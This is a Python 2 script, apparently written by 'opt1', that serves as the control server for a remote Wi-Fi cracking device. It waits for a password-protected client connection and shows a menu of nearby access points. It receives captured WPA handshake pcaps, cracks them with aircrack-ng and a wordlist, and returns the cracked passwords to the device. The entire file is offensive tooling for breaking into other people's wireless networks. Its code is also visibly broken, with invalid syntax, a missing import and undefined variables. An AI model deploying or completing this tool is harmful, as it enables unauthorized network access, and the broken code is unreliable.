#!/usr/bin/env python
# written by opt1

from socket import *
import sys, crypt, hashlib, os, re, thread, time

def trashCan(port, password):
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
        s.bind(("0.0.0.0", int(port)))
        s.listen(1)
        data = 'x'
        x = ''
        n = 0
        buf = []
        filename = ''

        print "Waiting for Oscar The Grouch:\n"
        (oscar, (ip, port)) = s.accept()
        print "Connection from: ", ip
    except Exception, error:
        print '\n'+str(error)+'\n'
    try:
        while len(data):
            data = oscar.recv(2048)
            print 'data: '+str(data)+'\n'

            if '0x10' in data:
                oscar.send('0x11')

            if '0x12:' in data:
                tPass = data.split(':')[1:]
                cPass = str(tPass[0].strip())
                cPass = crypt.crypt(cPass, 'Oscar')
                if cPass == password:
                    oscar.send('0x14')
                else:
                    s.close()

            if '0x20' in data:
                oscar.send('0x21')

            if '0x22:' in data:
                targetId = data.split(':')[1:]
                try:
                    with open(targetId, 'r') in crackFile:
                        for item in crackFile:
                            crackpass = item
                            cracked = 1
                            oscar.send('0x15:'+crackPass)
                            connVpn()

                except:
                    if cracked != 1:
                        oscar.send('0x50')

            if '0x30' in data:
                oscar.send('0x31')
                data = '0'

            if '0x32:' in data:
                ap_list = data.split(';')
                n = 1
                print " 0\t - Rescan Networks"
                print " 999\t - Put Client to Sleep for 10 Minutes"
                for item in ap_list[1:]:
                    item = item.split('/')[:1]
                    item = item[0].split('"')[1:2]
                    print " {0}\tAccess Point: {1}\t".format(n, item)
                    n+=1
                n = 0
                while n != 1:
                    tmp = int(raw_input('Choose a number: '))
                    if tmp == 0:
                        oscar.send('0x31')
                    if tmp == 999:
                        oscar.send('0x50')
                    if (tmp != 0) and (tmp != 999):
                        essid = ap_list[int(tmp)]
                        print 'essid: '+str(ap_list[tmp])+'\n'
                        oscar.send('0x35:'+essid)
                    n = 1

            if '0x40' in data:
                oscar.send('0x41')
                print 'recving file now...\n'
                while x != 'EOF':
                    data = oscar.recv(2048)
                    sys.stdout.write('.')
                    buf.append(data)
                    if '$EOF$' in data:
                        x = 'EOF'
                print 'pcap recv loop done'
                data = '0x25'
                tmpstr = str(''.join(buf))
                buf = []
                buf = tmpstr.split("$x$")
                essid = buf[0]
                print 'essid: '+str(essid)+'\n'
                filename = str(get_name(essid))
                targetId = hashlib.md5(filename).hexdigest()[:12]
                pcap = str(buf[1].strip('$EOF$'))

                # Write pcap
                fileEssid = open(filename, 'a')
                fileEssid.write(pcap)
                fileEssid.close()
                print 'wrote pcap file, sending 0x24\n'
                oscar.send('0x24:'+targetId)
                thread.start_new_thread(crackPcap,(filename, bssid, targetId))
                #write target
                fileTargetId = open('target.lst', 'a')
                fileTargetId.write(str(targetId+':'+filename+'\n'))
                fileTargetId.close()

            if '0x25' in data:
                oscar.send('0x50')

    except Exception, error:
        print '\n'+str(error)+'\n'

def crackPcap(filename, bssid, targetId):
    p = subprocess.Popen(["aircrack-ng", filename, "-b", bssid, "-w", "/dic/wpa-list", "-l", targetId], stdout=subprocess.PIPE)
    out, err = p.communicate()

def connVpn():
    print 'Password cracked, sent to client, open vpn connection with client'
    print 'This means everything works!!!, heck yea!'
    sys.exit(0)

#Saves up to 10 pcaps for each essid.
def get_name(essid):
    print 'essid: '+essid+'\n'
    buf = os.listdir('.')
    x = []
    [x.append(item) for item in buf if (essid in item)]
    if x:
        x.sort()
        num = len(x)
        regex = re.search("\.(\d)", x[num-1])
        num = int(regex.group().strip('.'))
        num+=1
        reply = essid+'.'+str(num)
        print 'reply: '+reply+'\n'
    else:
        reply = str(essid+'.0')
    return reply


def usage():
    print "./oscarthegrouch <port> <password>\n"
    sys.exit(0)

def main():
    if len(sys.argv) < 3:
        print usage()
    port = sys.argv[1]
    password = crypt.crypt(sys.argv[2], 'Oscar')

    while True:
        trashCan(port, password)

if __name__ == "__main__":
    main()
